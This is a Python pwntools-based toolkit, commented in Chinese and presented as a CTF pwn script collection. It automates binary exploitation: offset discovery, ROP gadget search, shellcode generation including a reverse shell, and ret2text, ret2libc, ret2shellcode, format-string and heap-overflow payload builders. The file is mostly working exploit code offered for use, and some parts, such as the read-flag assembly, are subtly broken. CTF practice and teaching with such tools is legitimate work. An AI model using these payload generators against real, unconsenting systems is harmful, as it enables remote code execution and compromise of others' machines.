#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF Pwn常用脚本工具集
包含栈溢出、ROP、堆利用等常用攻击脚本
"""

import struct
import subprocess
import re
import os
from pwn import *

class PwnTools:
    def __init__(self):
        context.log_level = 'info'
        
    def find_offset(self, binary_path, input_method='stdin'):
        """查找栈溢出偏移量"""
        print(f"[+] Finding offset for {binary_path}")
        
        # 生成循环模式
        pattern = cyclic(200)
        
        if input_method == 'stdin':
            # 通过stdin输入
            p = process(binary_path)
            p.sendline(pattern)
            p.wait()
            
            # 获取core dump
            core = p.corefile
            stack = core.rsp
            offset = cyclic_find(stack)
            
        elif input_method == 'argv':
            # 通过命令行参数
            try:
                p = process([binary_path, pattern])
                p.wait()
                core = p.corefile
                stack = core.rsp
                offset = cyclic_find(stack)
            except:
                offset = None
        
        if offset:
            print(f"[+] Offset found: {offset}")
            return offset
        else:
            print("[-] Offset not found")
            return None
    
    def find_gadgets(self, binary_path, gadget_type='all'):
        """查找ROP gadgets"""
        print(f"[+] Finding ROP gadgets in {binary_path}")
        
        elf = ELF(binary_path)
        rop = ROP(elf)
        
        gadgets = {}
        
        if gadget_type in ['all', 'pop']:
            # 查找pop gadgets
            try:
                gadgets['pop_rdi'] = rop.find_gadget(['pop rdi', 'ret']).address
            except:
                gadgets['pop_rdi'] = None
                
            try:
                gadgets['pop_rsi'] = rop.find_gadget(['pop rsi', 'ret']).address
            except:
                gadgets['pop_rsi'] = None
                
            try:
                gadgets['pop_rdx'] = rop.find_gadget(['pop rdx', 'ret']).address
            except:
                gadgets['pop_rdx'] = None
        
        if gadget_type in ['all', 'ret']:
            # 查找ret gadget
            try:
                gadgets['ret'] = rop.find_gadget(['ret']).address
            except:
                gadgets['ret'] = None
        
        if gadget_type in ['all', 'syscall']:
            # 查找syscall gadget
            try:
                gadgets['syscall'] = rop.find_gadget(['syscall']).address
            except:
                gadgets['syscall'] = None
        
        print(f"[+] Found gadgets: {gadgets}")
        return gadgets
    
    def generate_shellcode(self, arch='amd64', shell_type='execve'):
        """生成shellcode"""
        print(f"[+] Generating {shell_type} shellcode for {arch}")
        
        context.arch = arch
        
        if shell_type == 'execve':
            if arch == 'amd64':
                shellcode = asm(shellcraft.sh())
            elif arch == 'i386':
                shellcode = asm(shellcraft.sh())
            else:
                shellcode = asm(shellcraft.sh())
                
        elif shell_type == 'read_flag':
            if arch == 'amd64':
                shellcode = asm('''
                    mov rax, 2
                    mov rdi, flag_path
                    mov rsi, 0
                    syscall
                    
                    mov rdi, rax
                    mov rax, 0
                    mov rsi, rsp
                    mov rdx, 100
                    syscall
                    
                    mov rax, 1
                    mov rdi, 1
                    mov rsi, rsp
                    mov rdx, 100
                    syscall
                    
                    flag_path: .ascii "flag\\0"
                ''')
            else:
                shellcode = b"\x90" * 100  # NOP sled
        
        elif shell_type == 'reverse_shell':
            if arch == 'amd64':
                shellcode = asm(shellcraft.connect('127.0.0.1', 4444) + shellcraft.sh())
            else:
                shellcode = b"\x90" * 100
        
        print(f"[+] Shellcode length: {len(shellcode)}")
        print(f"[+] Shellcode: {shellcode.hex()}")
        
        return shellcode
    
    def ret2text_exploit(self, binary_path, target_function, offset):
        """ret2text攻击"""
        print(f"[+] Generating ret2text exploit")
        
        elf = ELF(binary_path)
        
        # 查找目标函数地址
        if isinstance(target_function, str):
            target_addr = elf.symbols.get(target_function)
            if not target_addr:
                print(f"[-] Function {target_function} not found")
                return None
        else:
            target_addr = target_function
        
        print(f"[+] Target function address: {hex(target_addr)}")
        
        # 构造payload
        payload = b'A' * offset
        payload += p64(target_addr) if elf.arch == 'amd64' else p32(target_addr)
        
        return payload
    
    def ret2libc_exploit(self, binary_path, offset, libc_base=None):
        """ret2libc攻击"""
        print(f"[+] Generating ret2libc exploit")
        
        elf = ELF(binary_path)
        
        if libc_base is None:
            # 尝试获取libc基址
            try:
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            except:
                print("[-] Could not find libc")
                return None
        else:
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            libc.address = libc_base
        
        # 查找gadgets和函数
        rop = ROP(elf)
        
        try:
            pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        except:
            print("[-] Could not find pop rdi gadget")
            return None
        
        system_addr = libc.symbols['system']
        binsh_addr = next(libc.search(b'/bin/sh'))
        
        print(f"[+] pop rdi gadget: {hex(pop_rdi)}")
        print(f"[+] system address: {hex(system_addr)}")
        print(f"[+] /bin/sh address: {hex(binsh_addr)}")
        
        # 构造ROP链
        payload = b'A' * offset
        
        if elf.arch == 'amd64':
            payload += p64(pop_rdi)
            payload += p64(binsh_addr)
            payload += p64(system_addr)
        else:
            payload += p32(system_addr)
            payload += p32(0)  # return address
            payload += p32(binsh_addr)
        
        return payload
    
    def ret2shellcode_exploit(self, binary_path, offset, shellcode_addr=None):
        """ret2shellcode攻击"""
        print(f"[+] Generating ret2shellcode exploit")
        
        elf = ELF(binary_path)
        
        # 生成shellcode
        shellcode = self.generate_shellcode(elf.arch)
        
        if shellcode_addr is None:
            # 假设shellcode在栈上
            shellcode_addr = 0x7fffffffe000  # 需要根据实际情况调整
        
        print(f"[+] Shellcode address: {hex(shellcode_addr)}")
        
        # 构造payload
        payload = shellcode
        payload += b'A' * (offset - len(shellcode))
        payload += p64(shellcode_addr) if elf.arch == 'amd64' else p32(shellcode_addr)
        
        return payload
    
    def format_string_exploit(self, binary_path, target_addr, value, offset):
        """格式化字符串攻击"""
        print(f"[+] Generating format string exploit")
        print(f"[+] Target address: {hex(target_addr)}")
        print(f"[+] Value to write: {hex(value)}")
        print(f"[+] Format string offset: {offset}")
        
        # 构造格式化字符串payload
        payload = b""
        
        # 64位系统
        if context.arch == 'amd64':
            # 写入地址
            payload += p64(target_addr)
            payload += p64(target_addr + 1)
            payload += p64(target_addr + 2)
            payload += p64(target_addr + 3)
            
            # 计算需要写入的字节
            byte1 = value & 0xff
            byte2 = (value >> 8) & 0xff
            byte3 = (value >> 16) & 0xff
            byte4 = (value >> 24) & 0xff
            
            # 构造格式化字符串
            written = 32  # 已经写入的字节数
            
            if byte1 > written:
                payload += f"%{byte1 - written}c".encode()
            payload += f"%{offset}$hhn".encode()
            written = byte1
            
            if byte2 > written:
                payload += f"%{byte2 - written}c".encode()
            payload += f"%{offset + 1}$hhn".encode()
            written = byte2
            
            if byte3 > written:
                payload += f"%{byte3 - written}c".encode()
            payload += f"%{offset + 2}$hhn".encode()
            written = byte3
            
            if byte4 > written:
                payload += f"%{byte4 - written}c".encode()
            payload += f"%{offset + 3}$hhn".encode()
        
        return payload
    
    def heap_overflow_exploit(self, binary_path, chunk_size, target_addr):
        """堆溢出攻击"""
        print(f"[+] Generating heap overflow exploit")
        
        # 基本的堆溢出payload
        payload = b'A' * chunk_size
        payload += p64(0)  # prev_size
        payload += p64(0x21)  # size
        payload += p64(target_addr)  # fd
        payload += p64(target_addr)  # bk
        
        return payload
    
    def check_protections(self, binary_path):
        """检查二进制文件保护机制"""
        print(f"[+] Checking protections for {binary_path}")
        
        elf = ELF(binary_path)
        
        protections = {
            'RELRO': 'Full' if elf.relro == 'full' else 'Partial' if elf.relro == 'partial' else 'No',
            'Stack Canary': 'Yes' if elf.canary else 'No',
            'NX': 'Yes' if elf.nx else 'No',
            'PIE': 'Yes' if elf.pie else 'No',
            'RPATH': 'Yes' if elf.rpath else 'No',
            'RUNPATH': 'Yes' if elf.runpath else 'No',
            'Symbols': len(elf.symbols),
            'FORTIFY': 'Yes' if elf.fortify else 'No'
        }
        
        print("[+] Protection status:")
        for prot, status in protections.items():
            print(f"    {prot}: {status}")
        
        return protections
    
    def leak_libc_address(self, binary_path, leak_function='puts'):
        """泄露libc地址"""
        print(f"[+] Generating libc address leak exploit")
        
        elf = ELF(binary_path)
        
        # 查找PLT和GOT
        if leak_function in elf.plt:
            plt_addr = elf.plt[leak_function]
            got_addr = elf.got[leak_function]
            
            print(f"[+] {leak_function} PLT: {hex(plt_addr)}")
            print(f"[+] {leak_function} GOT: {hex(got_addr)}")
            
            return {'plt': plt_addr, 'got': got_addr}
        else:
            print(f"[-] {leak_function} not found in PLT")
            return None
    
    def one_gadget_find(self, libc_path):
        """查找one_gadget"""
        print(f"[+] Finding one_gadgets in {libc_path}")
        
        try:
            result = subprocess.run(['one_gadget', libc_path], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                gadgets = []
                for line in result.stdout.split('\n'):
                    if line.startswith('0x'):
                        gadgets.append(int(line.split()[0], 16))
                
                print(f"[+] Found {len(gadgets)} one_gadgets")
                return gadgets
            else:
                print("[-] one_gadget tool not found or failed")
                return []
        except:
            print("[-] Error running one_gadget")
            return []
    
    def generate_rop_chain(self, binary_path, target='system', args=None):
        """生成ROP链"""
        print(f"[+] Generating ROP chain for {target}")
        
        elf = ELF(binary_path)
        rop = ROP(elf)
        
        if target == 'system':
            if args is None:
                args = ['/bin/sh']
            
            try:
                rop.system(args[0])
                print(f"[+] ROP chain generated:")
                print(rop.dump())
                return rop.chain()
            except:
                print("[-] Failed to generate ROP chain")
                return None
        
        elif target == 'execve':
            if args is None:
                args = ['/bin/sh', 0, 0]
            
            try:
                rop.execve(args[0], args[1], args[2])
                return rop.chain()
            except:
                print("[-] Failed to generate execve ROP chain")
                return None
        
        return None

def main():
    """主函数 - 演示用法"""
    tools = PwnTools()
    
    print("CTF Pwn工具集")
    print("=" * 50)
    
    # 示例用法
    binary_path = "/bin/ls"  # 示例二进制文件
    
    print("\n1. 检查保护机制:")
    protections = tools.check_protections(binary_path)
    
    print("\n2. 查找ROP gadgets:")
    gadgets = tools.find_gadgets(binary_path, 'pop')
    
    print("\n3. 生成shellcode:")
    shellcode = tools.generate_shellcode('amd64', 'execve')
    
    print("\n4. 泄露libc地址:")
    leak_info = tools.leak_libc_address(binary_path, 'puts')
    
    print("\n5. 使用示例:")
    print("# 查找偏移量")
    print("offset = tools.find_offset('./vulnerable_binary')")
    print("\n# 生成ret2text exploit")
    print("payload = tools.ret2text_exploit('./binary', 'backdoor', offset)")
    print("\n# 生成ret2libc exploit")
    print("payload = tools.ret2libc_exploit('./binary', offset)")

if __name__ == "__main__":
    main()
